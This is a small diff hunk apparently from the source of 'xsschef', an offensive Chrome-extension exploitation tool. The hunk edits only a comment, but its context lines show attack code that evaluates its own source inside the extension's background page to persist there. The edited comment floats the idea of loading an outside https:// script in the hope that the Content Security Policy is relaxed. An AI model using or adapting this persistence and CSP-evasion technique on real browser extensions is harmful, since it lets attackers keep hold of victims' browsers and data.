@@ -278,7 +278,7 @@ function __xsschef() {
 
 if (location.protocol == 'chrome-extension:') { // evaluate only in extension code
     if (chrome.extension.getBackgroundPage()) {// try to persist in background page
-        // chrome 18 csp fix - maybe add script to document.body? 
+        // chrome 18 csp fix - maybe add https:// script to document.body and hope for relaxed CSP policy? 
         chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
     } else {
         __xsschef(); // no persistence :(
